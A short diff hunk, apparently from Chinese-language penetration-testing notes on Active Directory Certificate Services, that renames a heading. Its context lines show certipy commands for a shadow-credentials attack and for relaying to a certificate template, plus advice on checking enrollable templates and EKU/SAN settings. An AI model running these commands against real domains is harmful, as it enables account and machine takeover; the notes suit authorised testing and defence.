@@ -70,6 +70,6 @@ certipy shadow auto -u USER -p 'PASSWORD' -dc-ip 192.168.1.10
 certipy relay -target 192.168.1.10 -template Machine
 ```
 
-## 小记录
+## 备注
 
 AD CS 的排查重点是证书服务是否存在、模板是否可申请、是否允许错误的 EKU 或 SAN。枚举结果记下来，后面和 LDAP、BloodHound 一起对照会比较快。
